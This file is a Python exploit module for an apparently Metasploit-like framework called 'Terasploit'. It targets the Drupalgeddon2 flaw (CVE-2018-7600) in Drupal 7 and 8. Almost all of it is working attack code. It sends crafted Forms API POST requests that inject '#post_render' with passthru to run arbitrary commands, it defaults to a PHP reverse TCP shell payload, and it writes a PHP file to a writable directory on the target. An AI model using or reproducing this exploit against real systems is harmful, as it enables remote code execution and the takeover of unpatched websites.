#######
# Module/Exploit: Drupalgeddon2
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):

    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'     : 'Terasploit Framework License (BSD)',
                'Name'        : 'Drupal Drupalgeddon2',
                'Module'      : Module.exploit,
                'Payload'     : 'modules/payload/cmd/unix/php_reverse_tcp',
                "Platform"    : [ Platform.PHP, Platform.UNIX, Platform.LINUX ],
                "Arch"        : [ Arch.PHP, Arch.CMD ],
                'Author'      : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description' : [
                    'This module exploits a Drupal property injection in the Forms API.',
                    'Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1 are vulnerable.'
                ],
                'Reference'   : [
                    'CVE-2018-7600',
                    'metasploit (exploit/unix/webapp/drupal_drupalgeddon2)',
                    'https://nvd.nist.gov/vuln/detail/cve-2018-7600',
                    'https://www.exploit-db.com/exploits/44448',
                    'https://github.com/dreadlocked/Drupalgeddon2',
                    'https://github.com/FireFart/CVE-2018-7600'
                ]
            }
        )

        if info_only:
            return

        register_option ('exploit',opt=[
            OptURL.create('rhost',['','yes','the remote host target (url)']),
            OptProxy.create('proxy',['','no','json file containing proxies, json format {"protocol":"proxy",...}']),
            OptBool.create('ssl_verify',['false','no','check ssl certificate on the host']),
            OptValidate.create('function','php_function',['passthru','yes','php function to use']),
            OptString.create('uri_path',['/','yes','path to drupal install']),
            OptString.create('writable_dir',['/tmp','yes','writable dir']),
            OptInt.create('drupal_version',[8,'yes','the version of drupal, 8 if 8.x else 7 for 7.x version'])
        ])


    def exploit(self) -> str|None:
        payload, _ = Get.payload()
        shell = self.EncodeShell(payload.generate())
        target, writable_dir = self.OPT()[0], self.OPT()[5]
        self.ParseURL(target)
        
        php_file = f"{self.generate_random_name()}.php"
        tmp_file= f"{writable_dir.rstrip('/')}/{php_file}"
        
        payload_content = shell if module_info.payload_info['Arch'] == 'cmd' else f'echo "{shell}" | tee {tmp_file}'
        
        try:
            exploit = self.execute_cmd(tmp_file,payload_content)
            
            if exploit:
                return
            else:
                return 'failed'
            
            
        except KeyboardInterrupt as error: 
            print_info (error,type='RED')
            return 'failed'
        
    
    def execute_cmd(self,tmp_file,file_data) -> bool:
        drupal_ver = self.OPT()[6]
        
        if int(drupal_ver) == 8:
            exploit = self.drupal8(file_data,tmp_file)
            if exploit:
                return True
            else:
                return False
        
        if int(drupal_ver) == 7:
            exploit = self.drupal7(file_data,tmp_file)
            if exploit:
                return True
            else:
                return False
            
        if int(drupal_ver) != 7 or int(drupal_ver) != 8:
            print_info ('Invalid drupal version was specified.',type='YELLOW')
            return False
    
    
    def drupal7(self,code,tmp_file) -> bool:
        proxy, ssl_verify, php_func = self.OPT()[1], self.OPT()[2], self.OPT()[3]
    
        exploit = HTTP.Request('post',
            url=f"{Target.scheme}://{Target.hostname}",
            params={
                'q': 'user/password', 
                'name[#post_render][]': php_func.lower(), 
                'name[#markup]': code, 
                'name[#type]': 'markup'
            },
            data={
                'form_id': 'user_pass', 
                '_triggering_element_name': 'name'
            },
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(ssl_verify)
        )
        
        if exploit.status_code in self.good_status_code():
            print_info (f'Uploaded: {f"{Target.scheme}://{Target.hostname}/{tmp_file}"}', type="GREEN")
            return True
        else:
            print_info (f'Exploit failed, status code: {exploit.status_code}',type='red')
            return False
    
    
    def drupal8(self,code,tmp_file) -> bool:
        proxy, ssl_verify, php_func, uri_path = self.OPT()[1], self.OPT()[2], self.OPT()[3], self.OPT()[4]

        exploit = HTTP.Request('post',
            url=f"{Target.scheme}://{Target.hostname}{uri_path}user/register",
            params={
                'element_parents': 'account/mail/#value',
                'ajax_form': 1,
                '_wrapper_format': 'drupal_ajax'
            },
            data={
                'form_id': 'user_register_form', 
                '_drupal_ajax': '1', 
                'mail[#post_render][]': php_func.lower(),
                'mail[#type]': 'markup', 
                'mail[#markup]': code
            },
            proxies=self.GetProxy(proxy),
            verify=self.GetBoolean(ssl_verify)
        )
        
        if exploit.status_code in self.good_status_code():
            print_info (f'Uploaded: {f"{Target.scheme}://{Target.hostname}/{tmp_file}"}', type="GREEN")
            return True
        else:
            print_info (f'Exploit failed, status code: {exploit.status_code}',type='red')
            return False